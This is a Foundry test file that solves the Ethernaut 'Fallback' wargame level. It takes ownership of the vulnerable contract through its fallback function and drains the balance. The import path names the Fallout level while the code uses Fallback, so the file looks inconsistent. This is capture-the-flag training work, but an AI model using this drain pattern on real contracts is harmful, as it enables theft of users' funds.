// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "src/Ethernaut.sol";
import "src/02-Fallout/FalloutFactory.sol";

contract BaseSetUp is Test {

    Ethernaut ethernaut;
    address payable attacker;

    function setUp() public virtual {
        // Initialize Ethernaut contract
        ethernaut = new Ethernaut();

        // Initialize Attacker EOA
        attacker = payable(vm.addr(1));      
        vm.deal(attacker, 10 ether);
        vm.label(attacker, "Attacker");
    }
}

contract Attack is BaseSetUp {

    Fallback ethernautFallback;

    function setUp() public virtual override {
        BaseSetUp.setUp();

        // Initialize level
        FallbackFactory fallbackFactory = new FallbackFactory();
        ethernaut.registerLevel(fallbackFactory);

        vm.prank(attacker);
        address levelAddress = ethernaut.createLevelInstance(fallbackFactory);
        ethernautFallback = Fallback(payable(levelAddress));
        console.log("Ethernaut Fallback Challenge!");
    }

    function testAttack() public {
        
        vm.startPrank(attacker);

        // Make a valid contribution to bypass fallback
        ethernautFallback.contribute{value: 0.0001 ether}();
        assert(ethernautFallback.getContribution() == 0.0001 ether);

        // Use fallback to get ownership of the contract
        (bool success, ) = address(ethernautFallback).call{value:0.0001 ether}("");
        assert(ethernautFallback.owner() == attacker);

        // Drain wallet
        ethernautFallback.withdraw();
        assert(address(ethernautFallback).balance == 0);

        vm.stopPrank();
    }
}